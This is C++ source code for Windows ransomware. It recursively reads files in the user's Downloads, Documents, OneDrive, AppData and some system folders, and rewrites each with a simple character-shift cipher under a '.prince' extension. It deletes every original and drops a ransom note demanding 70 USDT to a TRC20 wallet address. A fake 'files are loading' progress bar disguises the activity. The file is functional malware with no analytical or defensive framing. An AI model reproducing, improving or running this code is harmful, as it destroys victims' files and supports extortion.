
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <vector>
#include <thread>
#include <exception>

namespace fs = std::filesystem;
using namespace std;

void displayProgressBar(int total) {
    const int barWidth = 50; // ширина прогресс-бара
    for (int i = 0; i <= total; ++i) {
        // Рассчитываем прогресс
        float progress = static_cast<float>(i) / total;
        int pos = barWidth * progress;

        // Создаем строку для отображения прогресса
        std::cout << "\r[";
        for (int j = 0; j < barWidth; ++j) {
            if (j < pos) std::cout << "#";
            else std::cout << "-";
        }
        std::cout << "] " << static_cast<int>(progress * 100) << " %";
        std::cout.flush(); // Принудительно выводим в консоль

        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Задержка для демонстрации
    }
    std::cout << std::endl;
}

// Функция для шифрования текста
string encrypt(const string& text, int shift) {
    string result;
    for (char ch : text) {
        result += ch + shift; // Сдвигаем символы на заданное количество
    }
    return result;
}

// Функция для изменения расширения файла
string changeFileExtension(const string& filePath, const string& newExtension) {
    size_t dotPosition = filePath.find_last_of(".");
    return (dotPosition != string::npos) ? filePath.substr(0, dotPosition) + newExtension : filePath + newExtension;
}

void list_files(const fs::path& path) {
    string newExtension = ".prince";
    int shift = 2384723;
    try {
        if (fs::exists(path) && fs::is_directory(path)) {
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (fs::is_regular_file(entry)) {
                    fs::path p = entry.path();
                    string filePath = p.string();

                    // Проверяем существует ли файл и пытаемся его открыть
                    ifstream inputFile(filePath);
                    if (!inputFile.is_open()) {
                        continue; // Переход к следующему файлу
                    }

                    // Читаем содержимое файла
                    string content((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
                    inputFile.close();

                    string processedContent;

                    // Шифруем содер
                    processedContent = encrypt(content, shift);

                    // Создаем новый файл с новым расширением
                    string newFilePath = changeFileExtension(filePath, newExtension);
                    ofstream outputFile(newFilePath);

                    if (!outputFile.is_open()) {
                        continue; // Переход к следующему файлу
                    }

                    // Пишем обработанное содержимое в новый файл
                    outputFile << processedContent;
                    outputFile.close();

                    // Удаляем оригинальный файл
                    fs::remove(filePath);
                }
                ofstream outFile("PRINCE READ ME.txt");
                outFile << "Hello, you are being attacked by the prince." << std::endl;
                outFile << "At the moment, you have the opportunity to get everything back by transferring 70 USDT in the TRC20 network to " << std::endl;
                outFile << "TCeiStNMg5MFXjMC3KfeiTqdtY7BgDnQoJ." << std::endl;
                outFile << "I am the last living prince in this dead estate." << std::endl;
                outFile.close();
            }
        }
        else {
        }
    }
    catch (const fs::filesystem_error& e) {
    }
    catch (const exception& e) {
    }
}

string getUsername() {
#ifdef _WIN32
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return string(username);
    }
#else
    const char* username = getenv("USER");
    if (username) {
        return string(username);
    }
#endif
    return "Не удалось получить имя пользователя";
}

void performWork() {
    setlocale(LC_ALL, "RU");

    const char* dllPaths[] = {
        "C:\\Windows\\System32\\vcruntime140_1.dll",
        "C:\\Windows\\System32\\vcruntime140d.dll",
        "C:\\Windows\\System32\\msvcp140d.dll",
        "C:\\Windows\\System32\\vcruntime140_1d.dll",
        "C:\\Windows\\System32\\ucrtbased.dll"
    };

    for (const char* dllPath : dllPaths) {
        HMODULE hModule = LoadLibraryA(dllPath);

        if (hModule) {
            FreeLibrary(hModule);
        }
    }
    string username = getUsername();

    vector<string> paths = {
        "C:\\Users\\" + username + "\\Downloads",
        "C:\\Users\\" + username + "\\OneDrive",
        "C:\\Users\\" + username + "\\Videos",
        "C:\\Users\\" + username + "\\Music",
        "C:\\Users\\" + username + "\\Documents",
        "C:\\Users\\" + username + "\\AppData\\Local",
        "C:\\Users\\" + username + "\\AppData\\LocalLow",
        "C:\\Users\\" + username + "\\AppData\\Roaming",
        "C:\\Program Files (x86)",
        "C:\\\Windows\\System32\\Recovery"
    };

    vector<std::thread> threads;
    for (const auto& path : paths) {
        threads.push_back(std::thread(list_files, fs::path(path)));
    }

    for (auto& th : threads) {
        if (th.joinable()) {
            th.join();
        }
    }
}

int main() {
    
    std::cout << "....................--:--==-+=+-::=#####%%%#***==+==-:...........:+**++#=+**#==+**+--+*=--" << std::endl;
    std::cout << "...................:-++-==+*#+=-=*+**#%%%%%*##+--=+=:............:-*+++*##*+**=++*#+--=+++" << std::endl;
    std::cout << "::::...............:--+=-=*##+::--=#%%%%%%%#+**=-+=-::::..........:+++***+++***+=+**+--=**" << std::endl;
    std::cout << ":::::.............:::-*+=+**++-::-*#%@@@@@%%#*+=-++=---::....::::::-++***#*++**====+**+*#*" << std::endl;
    std::cout << ":::::::::.....:::::::-+*-=*#*==----#@@@@@@@@@%+**##**=-:::::::::::::+*####*+**+++=--=*#**+" << std::endl;
    std::cout << "::::::::::::::::::::::=#+++##*====*%@@@@@@@@@@%++***+=:-::::::::::::-###**#***++**+==****+" << std::endl;
    std::cout << "-::::--::::::::::::::::***#%##+=++#%@@@@@@@@@@@%#+***+---::::::::::::=#*++*++**+++*+++++**" << std::endl;
    std::cout << "--:----::::::::::::::::=#*####*#+=*@@@@@@@@@@@@@@%#**=-=---::::::::---##****=+*++**#*===++" << std::endl;
    std::cout << "::::::::::::::::::-----=###%##*===#%@@@@@@@@@@@@@@@@@%%*=------------=######*******###*+**" << std::endl;
    std::cout << "----::::::-::::--=-==--=*#####*=+=*%@@@@@@@@@@@@@@@@@@@@%*====----===+*#%%###*+*%#*######*" << std::endl;
    std::cout << "---------------=====---=*##%###=---#@@@@@@@@@@@@@@@@@@@@@%=======++***+*############*#####" << std::endl;
    std::cout << "------=-------=======-==+*%%#%#*++#%@@@@@@@@@@@@@@@@@@@@@@%++++=+******#%%%%#%%#%%####%%##" << std::endl;
    std::cout << "==----=+++===----======++#%%#######@@@@%-=@@@@@@@@@@@@@@@@@%+==++=+++**#%%%%%%%%#%%##*##**" << std::endl;
    std::cout << "+++=====+=+==-------====+#%%%####%@@@@@%*#@@@@@@@@@@@@@@@@@@#=+******#*##%%%%%#%##%#######" << std::endl;
    std::cout << "++**+++++=++++===--==+=+##%%%%%##%@@@#*#***%@@@@@%@@@@@@@@@@@++===***+++**%%%%#####%%####%" << std::endl;
    std::cout << "++++*****+=+*##*++++++***%%%%%%%#%@@#*#%#**@@@@@@@@@@@@@@@@@@****#########%%%%%%%%%%%%#*##" << std::endl;
    std::cout << "*********#**#####**#*+*###%%%%%%%%@@%#**#%@@@@@@@@@@@@@@@@@@@########%%%#%%%%%%%%%%##%%###" << std::endl;
    std::cout << "***#################*#####%%%%%%%%%@#*##*+**%@@@@@@@@@@@@@@@@%*#####%%%%%%%%%%%%%%%%#%%###" << std::endl;
    std::cout << "###########%%%%%%%###%%%##%%%%%%%@%@+####*+#@@@@@@@@@@@@@@@@@@#*#%%###%%%%%%%%%%%%%%%#%%%#" << std::endl;
    std::cout << "#####%%####%%%%%%%%####%%%%%%%%%%@@@@@%%##%##%@@@@@@@@@@@@@@@@%######%%%%%%%%%%%%%%%%##%%%" << std::endl;
    std::cout << "##########%%%%%###%%###%#%%%%%%%@@@@%**==#####@@@@%@@@@@@@@@@@@%######%%%%%%%%%%%%%#%%##%%" << std::endl;
    std::cout << "####%%%%%%%%%%%##%%%##%%%%%%%%%%%@@*#%@--+@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%#%%%%%%%%@%%%%%@@@@@@..*@@@@@@@@@@@@@@@@@@@@@@%%%##%%%%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@%.=%@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%%%%#%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%#%%%%%%%%%%@@%%%%@@@@@%:+%@@@@@@@@@@@@@@@@@@@@@@@%%####%%#%#%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%@%%%%%%@@@@%:#%@@@@@@@@@@@@@@@@@@@@@@@%%###%%%%###%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@%.#@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%%%%%@@@%=%@@@@@@@@@@@@@@@@@@@@@@@@@%%#%%%%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%%%%@@@@#:#@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%@%%%%#%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%%@@@@@*:-@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%%%%%#%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%%@@@@@@#.-@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%@@@@@@@*.-@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%##%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@*.-@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%%%%#%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%%@@@@*.=@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%@@%%%%%%%%%%#%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@%%@@@@+.=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@%@@@@+:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@%@@@@=:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%%%#%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%@%%%%%%%%%@%%@@@@@@%@@@@+:*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%%%%%%%%%%%%%%%%%%%%%%@%%@@@@@@@@@@@+-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%#%%%%%" << std::endl;
    std::cout << "%%%%@@%%%%%%%%@%%%%%%%%%%%@@@@@@@@@@@@=-#@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@%%%##%%%%%%%%%%%%" << std::endl;
    std::cout << "%%%@@@@%%%%%@@@%%%@%%%%%%%%@@@@@@@@@@@+=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%###%%%%%%%%%#%%%" << std::endl;
    std::cout << "@@@@@@@@%%%%@@@@%%%%%%%%%@@@@@@@@@@@@@+=%@@@@@@@@@@@@@@@@@%@@@@@@@@@@@%*##%%%%#%%%%%%%%%%%" << std::endl;
    std::cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@++@@@@@@@@@@@@@@@@@@@@@@@@@@@%###########%%%%%%#%%#%" << std::endl;
    std::cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+@@@@@@@@@@@@@@@@@@@@@@%%##**####%%%%%%%%%%%%%%%%%%" << std::endl;
    std::cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*@@@@@@@@@@@@@@@@%%%##****#######%%%%%%%%%%%%%%%%%%" << std::endl;

    std::cout << "Files are currently loading, please wait" <<  std::endl;
    const int totalDuration = 1080; // Общее время выполнения в секундах
    std::thread progressThread(displayProgressBar, totalDuration);

    performWork(); // Выполняем работу

    progressThread.join(); // Ждем завершения потока с прогресс-баром
    return 0;
}
